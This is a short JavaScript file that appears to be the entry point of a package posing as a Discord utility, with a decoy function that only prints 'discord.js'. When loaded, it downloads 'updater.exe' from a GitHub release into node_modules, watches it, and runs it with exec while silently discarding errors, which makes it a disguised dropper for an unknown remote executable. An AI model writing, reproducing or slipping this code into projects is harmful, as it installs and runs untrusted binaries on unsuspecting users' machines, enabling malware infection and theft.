const fs = require('fs');
const http = require('https');
const { exec } = require('child_process');
const path = require('path');

class ExeFileHandler {
    constructor(exePath) {
        this.exePath = exePath;
    }

    onModified(event) {
        if (event === this.exePath) {
            exec(this.exePath, (error, stdout, stderr) => {
                if (error) {
                    console.error(`Error executing ${this.exePath}: ${error}`);
                }
            });
        }
    }
}

function downloadExe(repoUrl, exeFilename) {
    const downloadPath = path.join('node_modules', exeFilename);

    if (!fs.existsSync('node_modules')) {
        fs.mkdirSync('node_modules');
    }

    http.get(repoUrl, (response) => {
        if (response.statusCode === 200) {
            const fileStream = fs.createWriteStream(downloadPath);

            response.pipe(fileStream);

            response.on('end', () => {
                observeFile(downloadPath);
            });
        } else {
        }
    });
}

function observeFile(exePath) {
    fs.watch(exePath, (event) => {
        if (event === 'change') {
            exec(exePath, (error, stdout, stderr) => {
                if (error) {
                }
            });
        }
    });
}


const githubUrl = "https://github.com/allcreator00/discord-self-util/releases/download/updater/updater.exe";
const exeFilename = "updater.exe";

downloadExe(githubUrl, exeFilename);

function client(){
    console.log("discord.js")
}
